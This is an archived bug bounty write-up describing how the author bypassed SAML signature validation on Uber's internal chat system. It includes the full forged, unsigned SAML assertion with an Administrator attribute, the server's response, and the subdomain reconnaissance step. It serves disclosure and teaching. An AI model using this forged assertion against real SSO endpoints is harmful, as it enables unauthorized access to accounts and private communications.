---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-10-13_uber-bug-bounty-gaining-access-to-an-internal-chat-system.md
original_filename: 2017-10-13_uber-bug-bounty-gaining-access-to-an-internal-chat-system.md
title: 'Uber Bug Bounty: Gaining Access To An Internal Chat System'
category: documents
detected_topics:
- saml
- sso
- command-injection
- clickjacking
- api-security
tags:
- imported
- documents
- saml
- sso
- command-injection
- clickjacking
- api-security
language: en
raw_sha256: d25bbfc3cae234b71f9676322c8cad595b255bfc4264929b4dcd98adf07a05f8
text_sha256: 199d3b43de82d8b67c4bc3e808a0aa7bee3aab64e4c5b92f8aa3b1f64005b359
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Uber Bug Bounty: Gaining Access To An Internal Chat System

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-10-13_uber-bug-bounty-gaining-access-to-an-internal-chat-system.md
- Source Type: markdown
- Detected Topics: saml, sso, command-injection, clickjacking, api-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `d25bbfc3cae234b71f9676322c8cad595b255bfc4264929b4dcd98adf07a05f8`
- Text SHA256: `199d3b43de82d8b67c4bc3e808a0aa7bee3aab64e4c5b92f8aa3b1f64005b359`


## Content

---
title: "Uber Bug Bounty: Gaining Access To An Internal Chat System"
page_title: "Uber Bug Bounty: Gaining Access To An Internal Chat System – MISHRE"
url: "https://mishresec.wordpress.com/2017/10/13/uber-bug-bounty-gaining-access-to-an-internal-chat-system/"
final_url: "https://mishresec.wordpress.com/2017/10/13/uber-bug-bounty-gaining-access-to-an-internal-chat-system/"
authors: ["Michael Reizelman"]
programs: ["Uber"]
bugs: ["SAML", "Authentication bypass"]
bounty: "8,500"
publication_date: "2017-10-13"
added_date: "2024-02-01"
source: "pentester.land/writeups.json"
original_index: 6078
---

# Uber Bug Bounty: Gaining Access To An Internal Chat System

![logo](https://mishresec.wordpress.com/wp-content/uploads/2017/10/logo.png?w=840)

Uber is an american company which provides ride sharing services over the Internet worldwide.

This post is about a simple, yet pretty severe vulnerability which allowed me to view the company’s internal chat system by abusing their vulnerable SAML implementation.

While searching for assets owned by the company which are in scope for their bug bounty program, I came across the following internal subdomain: [https://uchat.uberinternal.com](https://web.archive.org/web/20170909200151/https://uchat.uberinternal.com/). I was able to find this subdomain by using the [https://crt.sh](https://web.archive.org/web/20170909200151/https://crt.sh/) website with the %.uberinternal.com wildcard.

After browsing this subdomain I was prompted with a button suggesting that I should login using the OneLogin SSO:

![uchat-3-1024x449](https://mishresec.wordpress.com/wp-content/uploads/2017/10/uchat-3-1024x449.png?w=840)

Since I already tested some Uber properties I guessed that this SSO was put in place in order to be used by Uber’s employees, utilizing SAML. Confirmation for this guess was received when the login button forwarded me to the following endpoint:

> <https://uchat.uberinternal.com/login/sso/saml>

The only way I thought of attacking this implementation would be to create a simple SAML assertion and send it to the same endpoint by using a POST request.

Before proceeding with this post, if you are unfamiliar with SAML SSO I recommend you to visit [www.economyofmechanism.com](https://web.archive.org/web/20170909200151/http://www.economyofmechanism.com/) to understand the basics of the SAML SSO flow.

I then set out to send a simple XML with no signature at all, in order to check if their SAML implemention indeed verifies the signature. To do this, I sent the following XML as part of a post request:

> ``
> 
> <samlp:Response xmlns:saml=”urn:oasis:names:tc:SAML:2.0:assertion” xmlns:samlp=”urn:oasis:names:tc:SAML:2.0:protocol” ID=”R0bdb6f33ef84425aa2782eab4483792762f297df” Version=”2.0″ IssueInstant=”2016-05-04T01:37:34Z” Destination=”” InResponseTo=”ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c”>  
>  <samlp:Status>  
>  <samlp:StatusCode Value=”urn:oasis:names:tc:SAML:2.0:status:Success”/>  
>  </samlp:Status>  
>  <saml:Assertion xmlns:saml=”urn:oasis:names:tc:SAML:2.0:assertion” xmlns:xs=”[http://www.w3.org/2001/XMLSchema&#8221](http://www.w3.org/2001/XMLSchema&#8221); xmlns:xsi=”[http://www.w3.org/2001/XMLSchema-instance&#8221](http://www.w3.org/2001/XMLSchema-instance&#8221); Version=”2.0″ ID=”pfxb75932c2-2e44-d18d-224b-354849a292af” IssueInstant=”2016-05-04T01:37:34Z”>  
>  <saml:Subject>  
>  <saml:NameID Format=”urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress”>  
>  michael@test  
>  </saml:NameID>  
>  <saml:SubjectConfirmation Method=”urn:oasis:names:tc:SAML:2.0:cm:bearer”>  
>  <saml:SubjectConfirmationData NotOnOrAfter=”2016-05-04T01:40:34Z” Recipient=”” InResponseTo=”ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c”/>  
>  </saml:SubjectConfirmation>  
>  </saml:Subject>  
>  <saml:Conditions NotBefore=”2016-05-04T01:34:34Z” NotOnOrAfter=”2016-05-04T01:40:34Z”>  
>  <saml:AudienceRestriction>  
>  <saml:Audience>  
>  php-saml  
>  </saml:Audience>  
>  </saml:AudienceRestriction>  
>  </saml:Conditions>  
>  <saml:AuthnStatement AuthnInstant=”2016-05-04T01:37:33Z” SessionNotOnOrAfter=”2016-05-05T01:37:34Z” SessionIndex=”_b340ffa0-f3c6-0133-3483-02a5406d9a2f”>  
>  <saml:AuthnContext>  
>  <saml:AuthnContextClassRef>  
>  urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport  
>  </saml:AuthnContextClassRef>  
>  </saml:AuthnContext>  
>  </saml:AuthnStatement>  
>  <saml:AttributeStatement>  
>  </saml:Attribute> <saml:Attribute NameFormat=”urn:oasis:names:tc:SAML:2.0:attrname-format:basic” Name=”Email”>  
>  <saml:AttributeValue xmlns:xsi=”[http://www.w3.org/2001/XMLSchema-instance&#8221](http://www.w3.org/2001/XMLSchema-instance&#8221); xsi:type=”xs:string”>  
>  noreply@uber.com  
>  </saml:AttributeValue>  
>  </saml:Attribute>  
>  <saml:Attribute NameFormat=”urn:oasis:names:tc:SAML:2.0:attrname-format:basic” Name=”memberOf”>  
>  <saml:AttributeValue xmlns:xsi=”[http://www.w3.org/2001/XMLSchema-instance&#8221](http://www.w3.org/2001/XMLSchema-instance&#8221); xsi:type=”xs:string”>  
>  Administrator  
>  </saml:AttributeValue>  
>  </saml:Attribute>  
>  </saml:AttributeStatement>  
>  </saml:Assertion>  
>  </samlp:Response>

When sending this SAML to the above endpoint, the server responded unexpectedly – instead of saying that my SAML Assertion was invalid since it didn’t contain any signature (to verify the SAML issuer), it responded with the following:

> HTTP/1.1 302 Found
> 
> Date: Sat, 22 Apr 2017 08:33:35 GMT
> 
> Content-Type: text/plain; charset=utf-8
> 
> Content-Length: 0
> 
> Connection: keep-alive
> 
> Server: nginx/1.11.5
> 
> Set-Cookie: srv_id=; expires=Sun, 23-Apr-17 08:33:35 GMT; domain=uberinternal.com; path=/
> 
> Content-Security-Policy: frame-ancestors ‘self’
> 
> **Location: /error?title=uchat+%28staging%29+needs+your+help%3A &message=SAML+login+was+unsuccessful+because+one+of+the+attributes+is+incorrect.**
> 
> **+Please+contact+your+System+Administrator. &details=Username+attribute+is+missing&link=%2F&linkmessage=Go+back+to+uChat**
> 
> X-Cluster-Id: X-Frame-Options:
> 
> SAMEORIGIN X-Request-Id: uhg97nm9k3g19reb34gm8t6wjr
> 
> X-Version-Id: 3.7.0.90.8fa8ba5e2ac11ee1f038953dfce9edd0.true

I understood that the username field was missing from my assertion so I have added it, and after some more errors (Firstname, and Lastname were also missing) I was actually able to login to the system, without possessing an Uber employee acount:

![final-1024x523.png](https://mishresec.wordpress.com/wp-content/uploads/2017/10/final-1024x523.png?w=840)

I was now able to view and access different chat groups of Uber’s employees, spam their channels and potentially login as each of Uber’s employees to any channel, effectively bypassing their authentication scheme.

I immediately reported this to Uber’s security team, who fixed this bug pretty quickly by adding validation of the SAML signature.

Timeline:

Apr 22nd 2017 – Initial report via Hackerone

Apr 25th 2017 – Report needs more info

Apr 25th 2017 – Video sent

Apr 29th 2017 – Report Triaged & 500$ given

May 1st 2017 – Report Resolved

May 1st 2017 – Another 8000$ rewarded

### Share this:

  * [ Share on X (Opens in new window) X ](https://mishresec.wordpress.com/2017/10/13/uber-bug-bounty-gaining-access-to-an-internal-chat-system/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://mishresec.wordpress.com/2017/10/13/uber-bug-bounty-gaining-access-to-an-internal-chat-system/?share=facebook)
  * 

Like Loading...

### _Related_

![Unknown's avatar](https://2.gravatar.com/avatar/27a0c0c355fdfc73f79c8a66dc45fa3c0e95fe08072498e814f4d03f8439ce35?s=49&d=identicon&r=G)Author  [Michael Reizelman](https://mishresec.wordpress.com/author/michaelsitesite/)Posted on [October 13, 2017October 13, 2017](https://mishresec.wordpress.com/2017/10/13/uber-bug-bounty-gaining-access-to-an-internal-chat-system/)
